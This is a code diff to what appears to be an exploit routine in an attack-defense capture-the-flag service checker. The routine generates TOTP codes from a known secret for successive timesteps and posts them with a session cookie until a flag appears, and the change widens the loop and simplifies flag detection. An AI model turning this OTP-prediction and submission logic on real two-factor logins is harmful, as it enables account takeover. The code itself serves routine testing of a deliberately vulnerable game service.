@@ -390,24 +390,14 @@ async def exploit_zero(task: ExploitCheckerTaskMessage,
     totp_device.calculate_current_timestep_count()
 
     rangep = int(60/totp_device.timestep)
-    for i in range(rangep):
+    for i in range(rangep+1):
         usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter+i)
-        #logger.debug(f"round: {i}, user: {username}, accessing post: {title}, timestamp: {timestamp}, usercode: {usercode}")
 
         r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
         logger.debug(f"response: {r.text}")
-        html = BeautifulSoup(r.text, "html.parser")
-        try:
-            body = html.find('p', attrs={"class":"body"})
-            if body is not None:
-                logger.debug(f"paragraph: {body.string}")
-                if flag := searcher.search_flag(r.text):
-                    #await logout_user(client, logger, username)
-                    return flag
-        except:
-            raise MumbleException("Flag not found in exploit")
-
-    #await logout_user(client, logger, username)
+        if flag := searcher.search_flag(r.text):
+            #await logout_user(client, logger, username)
+            return flag
     raise MumbleException("Flag not found in exploit")
 
 @checker.exploit(1)
